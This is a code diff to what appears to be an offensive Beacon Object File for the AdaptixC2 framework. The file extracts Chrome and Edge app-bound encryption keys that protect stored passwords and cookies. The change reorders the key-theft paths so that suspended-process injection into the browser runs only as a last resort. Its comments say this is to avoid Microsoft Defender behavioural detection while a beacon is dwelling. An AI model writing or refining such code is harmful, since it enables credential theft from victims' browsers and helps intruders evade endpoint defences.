@@ -1101,10 +1101,11 @@ static unsigned char *GetAppBoundKeyBlob(const char *localStatePath, const char 
     }
     { DWORD off = sizeof(kCryptAppBoundKeyPrefix); unsigned char *stripped = (unsigned char *)intAlloc(b64len - off); if (!stripped) { intFree(encKey); return NULL; } MSVCRT$memcpy(stripped, encKey + off, b64len - off); intFree(encKey); encKey = stripped; b64len -= off; }
 
-    /* --- path H: suspended-process injection (defeats PathValidation) --- */
-    keyBlob = GetAppBoundKeyViaHollow(browser, encKey, b64len, browserPid, outLen);
-
-    /* --- path A: IElevator COM (works as the user) --- */
+    /* --- path A: IElevator COM (works as the user) — DEFAULT ---
+     * No cross-process write; the elevator service decrypts just like Chrome
+     * itself does.  Cross-process injection (path H below) is a top-tier
+     * Defender behavioral trigger and fires the AdaptixC2 family correlation
+     * while a beacon is dwelling — so it must never be the first choice. */
     if (MSVCRT$strcmp(browser, "chrome") == 0) { clsid = &Chrome_CLSID_Elevator; iid = &Chrome_IID_IElevator2; }
     else if (MSVCRT$strcmp(browser, "msedge") == 0) { clsid = &Edge_CLSID_Elevator; iid = &Edge_IID_IElevator; }
     if (!keyBlob && clsid) {
@@ -1168,6 +1169,16 @@ static unsigned char *GetAppBoundKeyBlob(const char *localStatePath, const char 
         } else {
             BeaconPrintf(CALLBACK_ERROR, "[!] SYSTEM-layer DPAPI failed (beacon must be SYSTEM for path B)");
         }
+    }
+
+    /* --- path H: suspended-process injection — LAST RESORT only.
+     * Reached when path A (IElevator-as-user) had no elevator session for us
+     * AND path B (SYSTEM double-DPAPI) wasn't possible.  Cross-process write
+     * into a browser is the highest-signal op in this BOF; never run it when
+     * a quieter path produced the key. */
+    if (!keyBlob) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] falling back to suspended-process injection (path H)");
+        keyBlob = GetAppBoundKeyViaHollow(browser, encKey, b64len, browserPid, outLen);
     }
 
     intFree(encKey);
